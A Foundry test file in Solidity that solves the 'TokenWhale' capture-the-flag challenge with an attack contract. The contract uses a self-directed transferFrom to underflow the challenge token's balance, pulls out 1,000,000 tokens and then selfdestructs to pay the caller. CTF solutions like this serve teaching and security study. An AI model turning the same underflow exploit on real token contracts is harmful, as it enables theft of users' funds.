// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/math/TokenWhale.sol";
import "forge-std/console.sol";

// forge test --match-contract TokenWhaleTest -vvvv
contract TokenWhaleTest is Test {
    address player = address(100);
    address player2 = address(200);

    function setUp() public {
        vm.deal(player, 5 ether);
    }

    function testTokenWhaleHack() public {
        /****************
         * Factory setup *
         *************** */
        TokenWhaleChallenge tokenWhale = new TokenWhaleChallenge(player);
        vm.startPrank(player);
        address levelAddress = address(tokenWhale);
        uint256 initialPlayerBalance = player.balance;
        assertEq(initialPlayerBalance, 5 ether);
        assertEq(tokenWhale.balanceOf(player), 1000);
        /****************
         *    Attack     *
         *************** */
        /*
         * Goal: Find a way to accumulate at least 1,000,000 tokens to solve this challenge.
         * The idea here is to create a hack contract
         * We will approve the contract address an allowance of 1e18
         * In the exploit,transfer from msg.sender to msg.sender 1
         * Then make a transfer of 1_000_000
         */
        TokenWhaleHack tokenWhaleHack = new TokenWhaleHack(levelAddress);
        tokenWhale.approve(address(tokenWhaleHack), 1e18); // 1 ** 18
        tokenWhaleHack.exploit();

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = tokenWhale.isComplete();
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract TokenWhaleHack {
    TokenWhaleChallenge public tokenWale;

    constructor(address _address) public {
        tokenWale = TokenWhaleChallenge(_address);
    }

    function exploit() public {
        unchecked {
            tokenWale.transferFrom(msg.sender, msg.sender, 1);
            require(tokenWale.balanceOf(address(this)) >= 1000000);
            tokenWale.transfer(msg.sender, 1000000);
            // would send the funds directly to the creator and user of the malicious contract
            destroy(payable(msg.sender));
        }
    }

    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
